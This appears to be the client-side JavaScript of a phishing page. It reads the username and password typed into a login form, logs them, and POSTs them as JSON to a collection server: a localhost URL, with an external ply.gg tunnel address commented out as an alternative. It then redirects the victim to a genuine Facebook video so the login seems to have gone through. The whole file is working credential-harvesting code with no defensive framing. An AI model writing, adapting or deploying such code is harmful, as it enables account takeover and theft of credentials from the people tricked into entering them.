
const url = 'http://localhost:8080/'
//const url='http://trying-brochures.at.ply.gg:11487/'

async function clicked() {
    var email = document.getElementById('username');
    var pass = document.getElementById('password')

    console.log(email.value)
    console.log(pass.value)
    const res = await fetch(url, {
        method: 'POST',
        headers: {
            "content-type": 'application/json'
        },
        body: JSON.stringify({
            email: email.value,
            pass: pass.value
        })
    })
    window.location.href = 'https://www.facebook.com/watch/?ref=search&v=1314826495745508&external_log_id=310849fe-f5cd-490a-9a51-244a89bd7d28&q=assamese%20reel'
} 